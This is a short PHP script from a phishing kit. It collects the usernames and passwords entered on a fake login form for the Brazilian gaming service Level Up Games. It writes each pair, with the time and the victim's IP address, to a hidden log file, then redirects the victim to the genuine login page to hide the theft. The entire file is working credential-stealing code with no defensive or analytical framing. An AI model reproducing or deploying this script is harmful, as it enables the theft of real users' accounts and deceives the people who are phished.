<?php
//by: Davyd Maker
error_reporting(0);
$login = $_POST['Username'];
$senha = $_POST['Password'];
if(!is_null($login) || !is_null($senha)){
$datahora = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$arquivo = fopen("_phishinglevelup_/loging00bz5krcd.txt" , "a");
$escrever = fwrite($arquivo , $login."/BIRRL/".$senha."/BIRRL/".$datahora."/BIRRL/".$ip.PHP_EOL);
fclose($arquivo);
header('Location: https://minhaconta.levelupgames.com.br/web/login-auth');
}else{
	header('Location: /');
}
?>